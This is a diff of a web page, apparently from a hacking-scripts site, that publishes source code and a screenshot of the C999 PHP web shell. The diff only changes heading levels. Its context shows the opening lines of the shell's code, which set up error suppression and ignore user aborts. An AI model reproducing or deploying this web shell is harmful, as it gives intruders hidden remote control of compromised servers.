@@ -41,7 +41,7 @@
 
 <p>I have received many more C99 scripts since this one, most of them complete and more up-to-date than this one.</p>
 
-<h2>C999 Shell Script Source Code</h2>
+<h3>C999 Shell Script Source Code</h3>
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;?php //Starting calls if (!function_exists("getmicrotime")) {function getmicrotime() { list($usec, $sec) = explode(" ", microtime());  return ((float)$usec + (float)$sec);}} error_reporting(5); @ignore_user_abort(TRUE); @set_magic_quotes_runtime(0); $win = strtolower(substr(PHP_OS,0,3)) == "win"; define("starttime",getmicrotime()); if (get_magic_quotes_gpc()) {if (!function_exists("strips")) { function strips(&$arr,$k="") {if (is_array($arr))  {foreach($arr as $k=--&gt;$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}}
 else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
@@ -1215,7 +1215,7 @@ Please, select database
 ?&gt;
 </pre>
 
-<h2>C999 shell Screenshot<figure id="attachment_323" style="width: 604px;" class="wp-caption aligncenter"></h2>
+<h3>C999 shell Screenshot<figure id="attachment_323" style="width: 604px;" class="wp-caption aligncenter"></h3>
 
 <p><a href="/HackingScripts/wp-content/uploads/2014/01/c999.png"><img src="/HackingScripts/wp-content/uploads/2014/01/c999-1024x511.png" alt="C999 shell script screenshot" width="604" height="301" class="size-large wp-image-323" /></a><figcaption class="wp-caption-text">C999 shell script screenshot</figcaption></figure></p>
 
